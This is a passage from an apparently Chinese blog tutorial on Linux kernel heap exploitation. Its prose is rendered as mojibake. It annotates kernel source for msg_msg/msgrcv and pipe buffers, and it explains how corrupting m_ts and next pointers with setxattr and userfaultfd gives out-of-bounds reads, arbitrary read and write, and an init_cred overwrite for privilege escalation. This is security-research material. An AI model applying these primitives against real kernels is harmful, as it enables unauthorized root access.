|| (long) bufsz < 0)\n        return -EINVAL;\n    //è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink\n    if (msgflg & MSG_COPY) {\n        //ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™\n        if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))\n            return -EINVAL;\n        //è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg\n        //ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†\n        //ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰\n        copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));\n        /*\n        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)\n        {\n            struct msg_msg *copy;\n            \n            copy = load_msg(buf, bufsz);\n            if (!IS_ERR(copy))\n                copy->m_ts = bufsz;\n            return copy;\n        }\n        */\n        if (IS_ERR(copy))\n            return PTR_ERR(copy);\n    }\n    //è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤\n    //åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º\n    //......\n    //å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg\n    for (;;) {\n        //.....\n        msg = find_msg(msq, &msgtyp, mode);\n        if (!IS_ERR(msg)) {\n            /*\n\t\t\t * Found a suitable message.\n\t\t\t * Unlink it from the queue.\n\t\t\t */\n            //æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†\n            if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n                msg = ERR_PTR(-E2BIG);\n                goto out_unlock0;\n            }\n            /*\n\t\t\t * If we are copying, then do not unlink message and do\n\t\t\t * not update queue parameters.\n\t\t\t */\n            //è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg\n            if (msgflg & MSG_COPY) {\n                //è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª\n                msg = copy_msg(msg, copy);\n                goto out_unlock0;\n            }\n\n            //ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†\n            list_del(&msg->m_list);\n            msq->q_qnum--;\n            msq->q_rtime = ktime_get_real_seconds();\n            ipc_update_pid(&msq->q_lrpid, task_tgid(current));\n            msq->q_cbytes -= msg->m_ts;\n            atomic_sub(msg->m_ts, &ns->msg_bytes);\n            atomic_dec(&ns->msg_hdrs);\n            ss_wakeup(msq, &wake_q, false);\n\n            goto out_unlock0;\n        }\n        //....\n    }\n\nout_unlock0:\n    ipc_unlock_object(&msq->q_perm);\n    wake_up_q(&wake_q);\nout_unlock1:\n    rcu_read_unlock();\n    //å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—\n    if (IS_ERR(msg)) {\n        free_copy(copy);\n        return PTR_ERR(msg);\n    }\n    //è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶\n    bufsz = msg_handler(buf, msg, bufsz);\n    //æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾\n    free_msg(msg);\n\n    return bufsz;\n}\n\n```\n\n##### A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–\n\nä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨`msg_msg`è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ`MSG_COPY`è¿™ä¸ª`msgflg`æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„`unlink`è§¦å‘é”™è¯¯ã€‚\n\n```c\n//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„\n/* If we are copying, then do not unlink message and do\n    * not update queue parameters.\n    */\nif (msgflg & MSG_COPY) {\n    msg = copy_msg(msg, copy);\n    goto out_unlock0;\n}\n\n//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„\nlist_del(&msg->m_list);\nmsq->q_qnum--;\nmsq->q_rtime = ktime_get_real_seconds();\nipc_update_pid(&msq->q_lrpid, task_tgid(current));\nmsq->q_cbytes -= msg->m_ts;\natomic_sub(msg->m_ts, &ns->msg_bytes);\natomic_dec(&ns->msg_hdrs);\nss_wakeup(msq, &wake_q, false);\n\ngoto out_unlock0;\n```\n\nä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®`CONFIG_CHECKPOINT_RESTORE=y`æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„\n\n```c\n//v5.11 /ipc/msgutil.c\n#ifdef CONFIG_CHECKPOINT_RESTORE\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\t//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶\n}\n#else\n//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\treturn ERR_PTR(-ENOSYS);\n}\n#endif\n```\n\nğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„`v5.11`ä¸­ï¼Œ`MSG_NOERROR`å’Œ`MSG_COPY`ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº`copy_msg()`å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š\n\n![image-20220512163536660](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png)\n\næ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–`rdi(msg)`å’Œ`rsi(copy)`å¯¹åº”çš„`m_ts`è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ`copy`çš„`m_ts`æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„`msg`çš„`m_ts`é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚\n\n##### B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–\n\nåŒç†å¦‚æœä¸æŒ‡å®š`MSG_COPY`è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„`mtype`å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„`msgtpy`æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚\n\n##### C.æ•°æ®å¤åˆ¶\n\nä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯`MSG_NOERROR`å’Œ`MSG_COPY`è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦`size`å°äºé€šè¿‡`find_msg()`å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„`m_ts`ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾\n\n```c\nbufsz = msg_handler(buf, msg, bufsz);\nfree_msg(msg);\n```\n\n### (3)åˆ©ç”¨\n\n#### è¶Šç•Œè¯»å–\n\nè¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„`double-free/UAF`ï¼Œå¹¶ä¸”å†ä½¿ç”¨`setxattr`æ¥å¯¹`msg_msgmsg`ä¸­çš„`m_ts`è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨`msgrcv`çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚\n\n**ä½¿ç”¨`setxattr`çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·**\n\nä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª`msg_queue`å’Œå•ä¸ª`msg_msg`çš„å†…å­˜æ¨¡å‹\n\n![image-20220511113542467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png)\n\nå¯ä»¥çœ‹åˆ°å•ä¸ª`msg_msg`åœ¨`msg_queue`çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡`msgget`å’Œ`msgsnd`å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª`msg_msg`ç»“æ„ä½“çš„`msg_queue`ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª`msg_msg`çš„å¤´éƒ¨äº†\n\nè€Œå•ä¸ª`msg_msg`ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘`msg_queue`çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º`msg_queue`çš„å †åœ°å€äº†ã€‚\n\n\n\n#### ä»»æ„è¯»å–\n\nå®Œæˆä¸Šè¿°æ³„éœ²`msg_queue`çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°`msg_msg`çš„å†…å­˜å¸ƒå±€äº†\n\nç”±äºæˆ‘ä»¬çš„`msg_msg`æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹\n\n![5IcVxRaFQtg3HCW](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png)\n\nç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š\n\n```c\n//v4.9----ipc/msgutil.c\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n#define DATALEN_SEG\t((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))\n----------------------------------------------------------------\nint store_msg(void __user *dest, struct msg_msg *msg, size_t len)\n{\n\tsize_t alen;\n\tstruct msg_msgseg *seg;\n\n\talen = min(len, DATALEN_MSG);\n\tif (copy_to_user(dest, msg + 1, alen))\n\t\treturn -1;\n\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tdest = (char __user *)dest + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_to_user(dest, seg + 1, alen))\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n```\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹`next`æŒ‡é’ˆå’Œ`m_ts`ï¼Œç»“åˆè¯»å–`msg`æœ€ç»ˆè°ƒç”¨å‡½æ•°`store_msg`çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚\n\né‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°`msg_queue`ä¹‹åï¼Œå¯ä»¥å†å°†`msg_msg`çš„nextæŒ‡é’ˆæŒ‡å›`msg_queue`ï¼Œè¯»å‡ºå…¶ä¸­çš„`msg_msg`ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚\n\nè¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ`userfaultfd`å’Œ`setxattr`é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚\n\nåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚\n\n#### ä»»æ„å†™\n\nåŒæ ·çš„ï¼Œ`msg_msg`ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ`msgsnd`ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨`userfaultfd`åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚`init_cred`ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚\n\n## 2.pipeç®¡é“---kmalloc-1024/kmalloc-192\n\nå‚ç…§ï¼š[(31æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿè°ƒç”¨ï¼špipe()ç³»ç»Ÿè°ƒç”¨æºç åˆ†æ_rtoaxçš„åšå®¢-CSDNåšå®¢_linux pipe æºç ](https://blog.csdn.net/Rong_Toa/article/details/116270704)****\n\né€šå¸¸æ¥è®²ï¼Œç®¡é“ç”¨æ¥åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå› ä¸º`fork`å‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦å‰¯æœ¬ã€‚è¿™é‡Œå°±ä½¿ç”¨å½“å‰è¿›ç¨‹æ¥åˆ›å»ºç®¡é“ç¬¦ï¼Œä»ç®¡é“çš„è¯»å–ç«¯(`pipe_fd[0]`)å’Œå†™å…¥ç«¯(`pipe_fd[1]`)æ¥è¿›è¡Œåˆ©ç”¨ã€‚\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n```c\n#include <unistd.h>\n\n//ä½¿ç”¨pipeæˆ–è€…pipe2\nint pipe_fd[2];\n\npipe(pipe_fd);//é»˜è®¤é˜»å¡çŠ¶æ€\n//pipe2(pipe_fd,flag);\n```\n\nå…¶ä¸­`pipe2`å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨`__NR_pipe2`çš„`flag`æ”¯æŒé™¤0ä¹‹å¤–çš„ä¸‰ç§æ¨¡å¼ï¼Œå¯ç”¨åœ¨`man`æ‰‹å†Œä¸­æŸ¥çœ‹ã€‚\n\nå¦‚æœä¼ å…¥çš„`flag`ä¸º0ï¼Œåˆ™å’Œ`pipe`å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é˜»å¡çš„ã€‚\n\né˜»å¡çŠ¶æ€ï¼šå³å½“æ²¡æœ‰æ•°æ®åœ¨ç®¡é“ä¸­æ—¶ï¼Œå¦‚æœè¿˜è°ƒç”¨`read`ä»ç®¡é“è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—ç¨‹åºå¤„äºé˜»å¡çŠ¶æ€ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚\n\nä¼šé»˜è®¤åˆ›å»ºä¸¤ä¸ªfdæ–‡ä»¶æè¿°ç¬¦çš„ï¼Œè¯¥fdæ–‡ä»¶æè¿°ç¬¦æ•ˆæœçš„ç›¸å…³ç»“æ„å¦‚ä¸‹\n\n```c\n//v5.9  /fs/pipe.c\nconst struct file_operations pipefifo_fops = {\n\t.open\t\t= fifo_open,\n\t.llseek\t\t= no_llseek,\n\t.read_iter\t= pipe_read,\n\t.write_iter\t= pipe_write,\n\t.poll\t\t= pipe_poll,\n\t.unlocked_ioctl\t= pipe_ioctl,\n\t.release\t= pipe_release,\n\t.fasync\t\t= pipe_fasync,\n};\n```\n\næ”¾å…¥åˆ°`pipe_fd`ä¸­ï¼Œå¦‚ä¸‹\n\n```c\nint pipe_fd[2];\npipe(pipe_fd);\n\nprintf(\"pipe_fd[0]:%d\\n\",pipe_fd[0]);\nprintf(\"pipe_fd[1]:%d\\n\",pipe_fd[1]);\n```\n\næ•ˆæœå¦‚ä¸‹ï¼š\n\n![image-20220509161948796](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png)\n\nä¹‹åä½¿ç”¨`write/read`æ¥å†™å…¥è¯»å–å³å¯ï¼Œæ³¨æ„å†™å…¥ç«¯ä¸º`fd[1]`ï¼Œè¯»å–ç«¯ä¸º`fd[0]`\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(pipe_fd[1],msg,0x8);\nread(pipe_fd[0],buf,0x8);\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç”±äº`pipe`ç®¡é“åˆ›å»ºåä¼šå¯¹åº”åˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥é‡Šæ”¾ä¸¤ç«¯å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯é‡Šæ”¾ç®¡é“`pipe`ç®¡é“\n\n```c\nclose(pipe_fd[0]);\nclose(pipe_fd[1]);\n```\n\néœ€è¦å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦fdéƒ½ç»™é‡Šæ”¾æ‰æˆ–è€…ä½¿ç”¨`read`å°†ç®¡é“ä¸­æ‰€æœ‰æ•°æ®éƒ½è¯»å–å‡ºæ¥ï¼Œæ‰ä¼šè¿›å…¥`free_pipe_info`å‡½æ•°æ¥é‡Šæ”¾åœ¨çº¿æ€§æ˜ å°„åŒºåŸŸç”³è¯·çš„ç›¸å…³å†…å­˜èµ„æºï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚\n\n\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\n#### â‘ åˆ†é…\n\nå‘ç”Ÿåœ¨è°ƒç”¨`pipe`/`pipe2`å‡½æ•°ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨`__NR_pipe`/`__NR_pipe2`æ—¶ï¼Œå†…æ ¸å…¥å£ä¸º\n\n```c\nSYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)\n{\n\treturn do_pipe2(fildes, flags);\n}\n\nSYSCALL_DEFINE1(pipe, int __user *, fildes) /* pipe() ç³»ç»Ÿè°ƒç”¨ */\n{\n\treturn do_pipe2(fildes, 0);\n}\n```\n\nå‡½æ•°è°ƒç”¨é“¾ï¼š\n\n```\ndo_pipe2()->__do_pipe_flags()->create_pipe_files()->get_pipe_inode()->alloc_pipe_info()\n```\n\nè°ƒç”¨ä¹‹åä¼šåœ¨å†…æ ¸çš„çº¿æ€§æ˜ å°„åŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„å†…æ ¸å †ç®¡ç†çš„åŒºåŸŸã€‚åˆ†é…ç‚¹åœ¨å¦‚ä¸‹å‡½æ•°ä¸­ï¼š\n\n```c\n//v5.9 /fs/pipe.c\nstruct pipe_inode_info *alloc_pipe_info(void)\n{\n\tstruct pipe_inode_info *pipe;\n\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\n\n    //#define PIPE_DEF_BUFFERS\t16\n    //.....\n    //pipe_inode_infoç®¡ç†ç»“æ„ï¼Œå¤§å°ä¸º0xa0ï¼Œå±äºkmalloc-192\n\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\n\tif (pipe == NULL)\n\t\tgoto out_free_uid;\n\n    //.....\n    //ç›¸å…³çš„æ¶ˆæ¯ç»“æ„ä¸ºpipe_bufferæ•°ç»„,æ€»å…±16*0x28=0x280,ç›´æ¥ä»kmalloc-1024ä¸­æ‹¿å–å †å—\n\tpipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\n\t\t\t     GFP_KERNEL_ACCOUNT);\n    \n    //.....\n\t//å¯¹ç”³è¯·çš„pipeç®¡é“è¿›è¡Œä¸€äº›åˆå§‹åŒ–\n\tif (pipe->bufs) {\n\t\tinit_waitqueue_head(&pipe->rd_wait);\n\t\tinit_waitqueue_head(&pipe->wr_wait);\n\t\tpipe->r_counter = pipe->w_counter = 1;\n\t\tpipe->max_usage = pipe_bufs;\n\t\tpipe->ring_size = pipe_bufs;\n\t\tpipe->nr_accounted = pipe_bufs;\n\t\tpipe->user = user;\n\t\tmutex_init(&pipe->mutex);\n\t\treturn pipe;\n\t}\n\n    //.....\n    //å‡ºé”™çš„è¯åˆ™ä¼šé‡Šæ”¾æ‰ï¼Œå…·ä½“å¹²å•¥çš„ä¸å¤ªæ¸…æ¥š\nout_free_uid:\n\tfree_uid(user);\n\treturn NULL;\n}\n```\n\nç›¸å…³çš„`pipe_inode_info`ç»“æ„å¦‚ä¸‹\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_inode_info {\n\tstruct mutex mutex;\n\twait_queue_head_t rd_wait, wr_wait;\n\tunsigned int head;\n\tunsigned int tail;\n\tunsigned int max_usage;\n\tunsigned int ring_size;\n#ifdef CONFIG_WATCH_QUEUE\n\tbool note_loss;\n#endif\n\tunsigned int nr_accounted;\n\tunsigned int readers;\n\tunsigned int writers;\n\tunsigned int files;//æ–‡ä»¶æè¿°ç¬¦è®¡æ•°ï¼Œéƒ½ä¸º0æ—¶æ‰ä¼šé‡Šæ”¾ç®¡é“\n\tunsigned int r_counter;\n\tunsigned int w_counter;\n\tstruct page *tmp_page;\n\tstruct fasync_struct *fasync_readers;\n\tstruct fasync_struct *fasync_writers;\n    //pipe_bufferæ•°ç»„,16ä¸ª,æ¯ä¸ªå¤§å°ä¸º0xa0,é€šå¸¸æˆ‘ä»¬ä»è¿™ä¸Šé¢æ³„éœ²åœ°å€æˆ–è€…åŠ«æŒç¨‹åºæµ\n\tstruct pipe_buffer *bufs;\n\tstruct user_struct *user;\n#ifdef CONFIG_WATCH_QUEUE\n\tstruct watch_queue *watch_queue;\n#endif\n};\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç›´æ¥ä½¿ç”¨`close`å‡½æ•°é‡Šæ”¾ç®¡é“ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdä¸¤ç«¯ã€‚\n\nå‡½æ•°é“¾è°ƒç”¨é“¾ï¼š\n\n```\npipe_release()->put_pipe_info()->free_pipe_info()\n```\n\néœ€è¦æ³¨æ„çš„æ—¶ï¼Œåœ¨`put_pipe_info`å‡½æ•°ä¸­\n\n```c\n//v5.9 /fs/pipe.c\nstatic void put_pipe_info(struct inode *inode, struct pipe_inode_info *pipe)\n{\n\tint kill = 0;\n\n\tspin_lock(&inode->i_lock);\n\tif (!--pipe->files) {\n\t\tinode->i_pipe = NULL;\n\t\tkill = 1;\n\t}\n\tspin_unlock(&inode->i_lock);\n\n    //å½“filesä¸º0æ‰ä¼šè¿›å…¥è¯¥å‡½æ•°\n\tif (kill)\n\t\tfree_pipe_info(pipe);\n}\n```\n\nåªæœ‰`pipe_inode_info`è¿™ä¸ªç®¡ç†ç»“æ„ä¸­çš„`files`æˆå‘˜ä¸º0ï¼Œæ‰ä¼šè¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯ç®¡é“ä¸¤ç«¯éƒ½å…³é—­æ‰æ‰è¡Œã€‚\n\nç›¸å…³é‡Šæ”¾å‡½æ•°`free_pipe_info`\n\n```c\n//v5.9 /fs/pipe.c\nvoid free_pipe_info(struct pipe_inode_info *pipe)\n{\n\tint i;\n    //....\n    //å’Œç®¡é“ç›¸å…³çš„é‡Šæ”¾æœ‰å…³ï¼Œä¹Ÿæ˜¯ç›¸å…³çš„æ¼æ´ç‚¹\n\tfor (i = 0; i < pipe->ring_size; i++) {\n\t\tstruct pipe_buffer *buf = pipe->bufs + i;\n\t\tif (buf->ops)\n\t\t\tpipe_buf_release(pipe, buf);\n\t}\n    //......\n    //é‡Šæ”¾pipe_bufferæ•°ç»„,kmalloc-1024\n\tkfree(pipe->bufs);\n    //é‡Šæ”¾pipe_inode_infoç®¡ç†ç»“æ„,kmalloc-192\n\tkfree(pipe);\n}\n```\n\n\n\n### (3)åˆ©ç”¨\n\n#### â‘ ä¿¡æ¯æ³„éœ²\n\n`pipe_buffer`ç»“æ„çš„`buf`\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\nå…¶ä¸­çš„`ops`æˆå‘˜ï¼Œå³`struct pipe_buf_operations`ç»“æ„çš„`pipe->bufs[i]->ops`ï¼Œå…¶ä¸­ä¿å­˜ç€å…¨å±€çš„å‡½æ•°è¡¨ï¼Œå¯é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²å†…æ 